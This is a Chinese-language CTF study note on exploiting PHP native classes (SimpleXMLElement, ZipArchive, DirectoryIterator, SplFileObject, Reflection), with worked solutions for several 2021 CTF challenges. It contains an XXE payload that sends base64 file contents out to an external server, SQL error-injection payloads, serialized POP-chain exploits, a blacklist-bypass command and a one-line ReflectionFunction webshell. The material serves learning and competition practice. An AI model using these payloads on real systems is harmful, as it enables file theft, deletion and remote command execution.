payload:\n数据库可以识别16进制并解码\n&#x27;||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||&#x27;//hex编码之后0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27 //由于报错的字符数有限制，需要用reverse再输出一次&#x27;||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||&#x27;//hex编码之后0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27\n修改send.xml\n&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://VPS/?%payl;&#x27;&gt;&quot;&gt;\n\n上传成功之后再利用SimpleXMLElement类进行SSRF，也就是访问URL：\n/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true\n之后查看web访问日志，将得到的结果base64解码之后即可。（注意由于分了2次上传，因此两次的文件名字需要不一样才行）\n这里不知道为啥一直实现不了,就看个思路吧…\n10.5 ZipArchive 类来删除文件\nZipArchive 类\nPHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。\n下面列举几个常见的类方法：\n- `ZipArchive::addEmptyDir`：添加一个新的文件目录- `ZipArchive::addFile`：将文件添加到指定zip压缩包中- `ZipArchive::addFromString`：添加新的文件同时将内容添加进去- `ZipArchive::close`：关闭ziparchive- `ZipArchive::extractTo`：将压缩包解压- `ZipArchive::open`：打开一个zip压缩包- `ZipArchive::deleteIndex`：删除压缩包中的某一个文件，如：`deleteIndex(0)`代表删除第一个文件- `ZipArchive::deleteName`：删除压缩包中的某一个文件名称，同时也将文件删除- ……\n我们来重点看看 ZipArchive::open 方法：\nZipArchive::open ( string $filename [, int $flags ] ) : mixed\n该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。\n- `$filename`：要打开的ZIP存档的文件名。- `$flags`：用于打开档案的模式。有以下几种模式：- `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。- `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。- `ZipArchive::RDONLY`：只读模式打开压缩包。- `ZipArchive::EXCL`：如果压缩包已经存在，则出错。- `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。\n注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将$flags赋值为8。\n也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。\nexample：\n$a = new ZipArchive();$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE);  // ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖// 因为没有保存，所以效果就是删除了1.txt\n[NepCTF 2021]梦里花开牡丹亭\n找了半天没找到复现环境，就跟着wp走一遍吧\n进入题目，给出源码：\n&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content;     public function __construct()    &#123;        $this-&gt;username=&#x27;user&#x27;;        $this-&gt;password=&#x27;user&#x27;;    &#125;     public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;    // admin            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125; &#125;class login&#123;    public $file;    public $filename;    public $content;     public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#x27;login success you can to open shell file!&#x27;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;            die(&#x27;success register admin&#x27;);        &#125;else&#123;            die(&#x27;please register admin &#x27;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#x27;waf.txt&#x27;))&#123;    // 当waf.txt没读取成功时才能得到flag            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);    // filename=php://filter/read=convert.base64-encode/resource=shell        &#125;    &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123;    @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125;\n这是一道反序列化题目，但是前面加了一个简单的PHP特性。\n1. 数组绕过哈希比较\n由于md5()和sha1()函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。\nexample：\n\n2. 利用php://filter读文件\n我们可以看到Open类里面的open()方法，当waf.txt文件存在的时候会执行echo file_get_contents($filename.&quot;.php&quot;);，而调用这个类方法是在Login类里面的checking()方法，\n而调用Login类的checking()方法的是Game类里面的__destruct()内置方法，因此我们就能够找到一条完整的利用链了，POC：\n自己大概也打通了，不错…\n&lt;?phpclass Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content;&#125; class login&#123;    public $file;    public $filename;       public $content;&#125; class Open&#123; &#125;$poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new Open();$poc-&gt;filename = &quot;php://filter/read=convert.base64-encode/resource=shell&quot;;$poc-&gt;content = &quot;xxx&quot;;echo base64_encode(serialize($poc));?&gt;\n得到：\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ==\n执行payload读取到shell.php的源码base64编码：\n果然啊，复现的时候，发现原来是waf.txt没创建，导致代码走不通…\n\nshell.php\n&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#x27;so long!&#x27;);    &#125;&#125;\n3. 利用ZipArchive类删除文件\n联合index.php里面的Open类：\nclass Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#x27;waf.txt&#x27;))&#123;    // 当waf.txt没读取成功时才能得到flag            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);    // filename=php://filter/read=convert.base64-encode/resource=shell        &#125;    &#125;&#125;\n可知我们只要使 file_get_contents('waf.txt') 读取失败就可以进入 shell($content) 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。\n刚好我们的ZipArchive类里面也有一个open()方法，\nZipArchive::open($filename, $flags = null)\n如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。\n所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：\n&lt;?php// highlight_file(__FILE__);error_reporting(-1);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content; &#125;class login&#123;    public $file;    public $filename;    public $content;&#125; class Open&#123;&#125; $poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new ZipArchive();$poc-&gt;filename = &quot;waf.txt&quot;;$poc-&gt;content = 8;echo base64_encode(serialize($poc));?&gt;\n得到payload：\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=\n\n执行之后即可删除waf.txt。注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件\n我这里是将文件夹权限设置为www即可\n4. 命令执行绕过黑名单和字符数限制\n最后一步就是执行我们的命令去读flag，回过头来看我们的shell.php\n&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#x27;so long!&#x27;);    &#125;&#125;\n这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例：\nn\\l /flag\nPOC:\n&lt;?php// highlight_file(__FILE__);error_reporting(-1);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content; &#125;class login&#123;    public $file;    public $filename;    public $content;&#125; class Open&#123;&#125; $poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new Open();$poc-&gt;filename = &quot;xxx&quot;;$poc-&gt;content = &quot;n\\l /flag&quot;;echo base64_encode(serialize($poc)); ?&gt;\n得到payload：这里估计是文件位置放的不对,我总是读不到\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9\n\n10.6 遍历目录类\nDirectoryIterator 类\nDirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n类摘要：\nDirectoryIterator extends SplFileInfo implements SeekableIterator &#123;    /* 方法 */    public __construct ( string $path )    public current ( ) : DirectoryIterator    public getATime ( ) : int    public getBasename ( string $suffix = ? ) : string    public getCTime ( ) : int    public getExtension ( ) : string    public getFilename ( ) : string    public getGroup ( ) : int    public getInode ( ) : int    public getMTime ( ) : int    public getOwner ( ) : int    public getPath ( ) : string    public getPathname ( ) : string    public getPerms ( ) : int    public getSize ( ) : int    public getType ( ) : string    public isDir ( ) : bool    public isDot ( ) : bool    public isExecutable ( ) : bool    public isFile ( ) : bool    public isLink ( ) : bool    public isReadable ( ) : bool    public isWritable ( ) : bool    public key ( ) : string    public next ( ) : void    public rewind ( ) : void    public seek ( int $position ) : void    public __toString ( ) : string    // 以字符串形式获取文件名    public valid ( ) : bool&#125;\n利用 DirectoryIterator 类遍历指定目录里的文件：\n如果我们这样：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir;\n会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：\n也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：\n\nglob:// 协议用来查找匹配的文件路径模式\n\n&lt;?php$dir=new DirectoryIterator(&quot;glob:///*flag*&quot;);echo $dir;\n\n\n如果想输出全部的文件名我们还需要对$dir对象进行遍历：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);&#125;\n\nFilesystemIterator 类\nFilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n该类的使用方法与DirectoryIterator 类也是基本相同的：\n&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;\n\n&lt;?php$dir=new FilesystemIterator(&quot;glob:///*flag*&quot;);echo $dir;\n\n&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);&#125;\n\nGlobIterator 类\n与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。\n类摘要：\nGlobIterator extends FilesystemIterator implements SeekableIterator , Countable &#123;    /* 方法 */    public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO )    public count ( ) : int    /* 继承的方法 */    public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS )    public FilesystemIterator::current ( ) : mixed    public FilesystemIterator::getFlags ( ) : int    public FilesystemIterator::key ( ) : string    public FilesystemIterator::next ( ) : void    public FilesystemIterator::rewind ( ) : void    public FilesystemIterator::setFlags ( int $flags = ? ) : void&#125;\n我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir; &lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;\n其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(/*flag*)：\n\n使用可遍历目录类绕过 open_basedir\nDirectoryIterator类或者FilesystemIterator类与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。\nexample:\n&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用&#125;?&gt; # payload一句话的形式:$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;\n\n使用FilesystemIterator类同理。\n而使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。\nexample:\n&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new GlobIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用&#125;?&gt; # payload一句话的形式:$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;\n\n10.7 可读取文件类\nSplFileObject 类\nSplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php\n该类的构造方法可以构造一个新的文件对象用于后续的读取。\n我们可以像类似下面这样去读取一个文件的一行：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context;\n\n但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123;    echo($f);&#125;//D:\\labwork\\phpstudy_pro\\WWW\\1.txt\n\n[DASCTF MAR 2021]ez_serialize\n进入题目，给出源码：\n&lt;?phperror_reporting(0);highlight_file(__FILE__); class A&#123;    public $class;    public $para;    public $check;    public function __construct()    &#123;        $this-&gt;class = &quot;B&quot;;        $this-&gt;para = &quot;ctfer&quot;;        echo new  $this-&gt;class ($this-&gt;para);    &#125;    public function __wakeup()    // 可以直接绕过__wakeup()方法的执行    &#123;        $this-&gt;check = new C;        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;            echo new  $this-&gt;class ($this-&gt;para);        &#125;        else            die(&#x27;bad hacker~&#x27;);    &#125; &#125;class B&#123;    var $a;    public function __construct($a)    &#123;        $this-&gt;a = $a;        echo (&quot;hello &quot;.$this-&gt;a);    &#125;&#125;class C&#123;     function vaild($code)&#123;        $pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\\&#x27;|&quot;|:|;|?]/i&#x27;;        if (preg_match($pattern, $code))&#123;            return false;        &#125;        else            return true;    &#125;&#125;  if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new A; &#125;\n这是一道PHP反序列化的题目，题目里面没有给出什么危险的函数调用，因此应该要想到是原生类的利用。留意这一段代码：\npublic function __wakeup()    // 可以直接绕过__wakeup()方法的执行   &#123;       $this-&gt;check = new C;       if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;           echo new  $this-&gt;class ($this-&gt;para);       &#125;       else           die(&#x27;bad hacker~&#x27;);   &#125;\n我们从反序列化的__wakeup()函数入手，看到新建了一个C的类对象，然后使用C类里面的check()方法对$para和$class这两个属性进行检查，看是否存在非法的字符，没有问题之后就使用echo new $this-&gt;class ($this-&gt;para);语句将新建类返回的内容输出。\n目录遍历类\n首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：\n&lt;?phpclass A&#123;    public $class=&#x27;FilesystemIterator&#x27;;        // FilesystemIterator(&quot;/var/www/html&quot;)    public $para=&quot;/var/www/html/&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n得到payload：\nO:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:14:&quot;/var/www/html/&quot;;s:5:&quot;check&quot;;N;&#125;\n执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE\n继续往下找:\n&lt;?phpclass A&#123;    public $class=&#x27;FilesystemIterator&#x27;;        // FilesystemIterator(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE&quot;)    public $para=&quot;/var/www/html/&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n在这个文件夹下找到了flag.php\n\n文件读取类\n然后我们使用 SplFileObject 类读取flag.php就行了：\n&lt;?phpclass A&#123;    public $class=&#x27;SplFileObject&#x27;;        // SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)    public $para=&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n得到payload：\nO:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:55:&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125;\n\n10.8 反射类Reflection\n它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。\nReflectionMethod 类获取类方法的相关信息\nReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 getDocComment() 方法，我们可以用它来获取类中各个函数注释内容\nexample:\n&lt;?phpclass FlagIsHere&#123;  /**   * 这是测试方法   * flag&#123;success&#125;   * @return int   */  protected function GiveMeFlag()  &#123;    return 9999;  &#125;&#125; $ref = new ReflectionMethod(&#x27;FlagIsHere&#x27;,&#x27;GiveMeFlag&#x27;);var_dump($ref-&gt;getDocComment());\n输出：\n\nReflectionClass类读取类的属性和方法名\nReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。\npublic ReflectionClass::__construct(mixed $argument)\n\n$argument：既可以是包含类名的字符串（string）也可以是对象（object）。\n\n用法如下\nexample：\n\n把类里面属性和方法的名字都能够显示出来。\nReflectionFunction类写Webshell\nReflectionFunction 类报告了一个函数的有关信息。其中invokeArgs()方法能够用来写Webshell。\npublic ReflectionFunction::invokeArgs(array $args): mixed\n\n$args：传递给函数的参数是一个数组，像call_user_func_array()的工作方式。\n\nexample:\n&lt;?phpfunction title($title, $name)&#123;    return sprintf(&quot;%s. %s\\r\\n&quot;, $title, $name);&#125; $function = new ReflectionFunction(&#x27;title&#x27;); echo $function-&gt;invokeArgs(array(&#x27;Dr&#x27;, &#x27;Phil&#x27;));?&gt;\n\n我们可以使用这个方法来写Webshell：\n&lt;?php    $func = new ReflectionFunction($_GET[m]);    echo $func-&gt;invokeArgs(array($_GET[c]));?&gt;\n\n[红帽杯 2021 final]upload\n由于线下是AWDplus的模式，需要挖洞并且修洞，直接给出了源码，有3个文件。\nclass.php\n&lt;?phpsession_start(); function red($fileinfo)&#123;    foreach($fileinfo as $key =&gt; $value)&#123;        $path = $value;        $name = $key;    &#125;    echo &quot;&lt;a style=&#x27;color:#ff6347&#x27; href=&#x27;$path&#x27;&gt;$name&lt;/a&gt;\\n&quot;;    return $name;&#125; function green($fileinfo)&#123;    foreach($fileinfo as $key =&gt; $value)&#123;        $path = $value;        $name = $key;    &#125;    echo &quot;&lt;a style=&#x27;color:#32cd32&#x27; href=&#x27;$path&#x27;&gt;$name&lt;/a&gt;\\n&quot;;    return $name;&#125;class file&#123;    public $path;    function __construct($path)    &#123;        $this-&gt;path = $path;    &#125;    function __toString()    &#123;        return basename($this-&gt;path);    &#125;&#125;\nindex.php\n&lt;?php include(&#x27;class.php&#x27;);if(!(isset($_SESSION[&#x27;func&#x27;]))) &#123;    $_SESSION[&#x27;func&#x27;] = &#x27;showfile&#x27;;&#125;if(!(isset($_SESSION[&#x27;files&#x27;]))) &#123;    $_SESSION[&#x27;files&#x27;] = array();&#125;if(!(isset($_SESSION[&#x27;paths&#x27;]))) &#123;    $_SESSION[&#x27;paths&#x27;] = array();&#125; if(isset($_POST[&#x27;filename&#x27;])&amp;&amp;isset($_POST[&#x27;content&#x27;]))&#123;    if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123;        die(&#x27;no h!&#x27;);    &#125;    $filepath = &#x27;./files/&#x27;.$_POST[&#x27;filename&#x27;];              $filename = basename($_POST[&#x27;filename&#x27;]);               file_put_contents($filepath,$_POST[&#x27;content&#x27;]);    $_SESSION[&#x27;files&#x27;][$filename] = $filepath;        $_SESSION[&#x27;paths&#x27;][$filepath] = &#x27;file&#x27;;            header(&#x27;Location:/?file=&#x27;.$filename); &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;    &lt;h3&gt;upload your file below&lt;/h3&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;filename&quot; value=&quot;filename&quot; style=&quot;width: 600px;&quot;&gt;        &lt;/br&gt;        &lt;/br&gt;        &lt;textarea type=&quot;text&quot; name=&quot;content&quot; style=&quot;width: 600px;height: 300px;&quot; &gt;&lt;/textarea&gt;        &lt;/br&gt;         &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;    &lt;/form&gt;    &lt;h4&gt;beatiful front&lt;/h4&gt;&lt;/div&gt;&lt;?phpif(rand(0,2)&gt;1)&#123;    $showfile = &#x27;red&#x27;;&#125;else&#123;    $showfile =&#x27;green&#x27;;&#125;$filelist = array();foreach ($_SESSION[&#x27;paths&#x27;] as $path=&gt;$class)&#123;              $temp = new $class($path);              if($class==&#x27;file&#x27;)&#123;                    $filelist[] = (string)$temp;        &#125;    else&#123;        $filelist[] = $temp;    &#125;&#125;$out = &#x27;&lt;p&gt;your file:&#x27;; foreach ($filelist as $value)&#123;    $out .= $value.&#x27; &#x27;;         &#125;echo $out.&#x27;&lt;/p&gt;&#x27;; if(isset($_GET[&#x27;file&#x27;]))&#123;    if(isset($_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]])) &#123;      //GET方法读取文件名，从session的文件名字里面寻找         $pathinfo = array($_GET[&#x27;file&#x27;]=&gt;$_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]]);        $&#123;$_SESSION[&#x27;func&#x27;]&#125;($pathinfo);    &#125;    else&#123;        echo &#x27;no such file!&#x27;;    &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt;\ninfo.php\n&lt;?phpphpinfo();\n分析题目\n首先是index页面\n\n这里能够让用户填写文件的文件名和内容，然后提交，提交的文件正常情况下会保存在./files目录下，看一下后台是怎么对文件进行操作的：\nif(isset($_POST[&#x27;filename&#x27;])&amp;&amp;isset($_POST[&#x27;content&#x27;]))&#123;    if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123;            // 对文件名有h字符的进行过滤        die(&#x27;no h!&#x27;);    &#125;    $filepath = &#x27;./files/&#x27;.$_POST[&#x27;filename&#x27;];      // 这里可以目录穿越    $filename = basename($_POST[&#x27;filename&#x27;]);       // basename()函数获取文件名字    file_put_contents($filepath,$_POST[&#x27;content&#x27;]);\n通过分析可以发现我们上传的文件存在目录穿越的问题，我们能通过filename=../xxxx这种方式将文件保存的路径穿越到服务器的任意路径下，但是由于存在对文件名h字符的过滤，因此无法直接传一个php文件到网站根目录下执行，得另寻僻径。\n.user.ini（无果）\n既然过滤掉了h字符，意味着.htaccess这样的修改配置文件意味着行不通，但是我想起了另外一个修改配置的文件.user.ini。.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。\n但是不是php.ini中的每个变量都能通过ini_set()或者.user.ini和.htaccess来设置，简单的来说每个变量有它所属于的模式，下面官方手册的四个模式\n\n通过上表，看到PHP_INI_USER模式中提到，可以在.user.ini中设定。但实际上，只要不是PHP_INI_SYSTEM模式下的属性，均可以在.user.ini中设置。\n那配置文件应该怎么写呢，这里有官方的配置选项列表：php.ini 配置选项列表\n在文件上传的题目中，我们只需记住这两个选项即可：\nauto_prepend_file = xxx        // 在每个文件头添加上指定文件的内容，相当于include(xxx)user_ini.cache_ttl = xx        // 设置配置的生效时间，默认300秒\n于是我们就想是否能够通过上传一个一句话木马文件，然后再目录穿越将.user.ini上传到网站根目录下，内容是让其他文件都包含这个一句话木马，从而实现getshell，但是尝试了很多次都无果，由此猜测运行的模式是PHP_INI_SYSTEM导致了.user.ini无法生效。\nSplFileObject类读文件\n比赛的时候做到这里其实已经没思路了（还是题目刷得少啊），赛后看有通过SplFileObject 类来读文件得思路，那先得了解一下SplFileObject 类是个什么玩意。\nSplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php\n该类的构造方法可以构造一个新的文件对象用于后续的读取。\n我们可以像类似下面这样去读取一个文件的一行：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context;        // 输出 root:x:0:0:root:/root:/bin/bash\n但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123;    echo($f);&#125;\nsession反序列化\n那么我们知道了这个类之后有什么用呢，似乎找不到可以用的地方啊，想想文件中是不是还有一个文件我们都没用上，其中必然藏有解题的关键。\n    $_SESSION[&#x27;files&#x27;][$filename] = $filepath;      // 将带有路径的文件名字作为键，文件路径作为值    $_SESSION[&#x27;paths&#x27;][$filepath] = &#x27;file&#x27;;         // 将文件目录作为键，&#x27;file&#x27;作为值    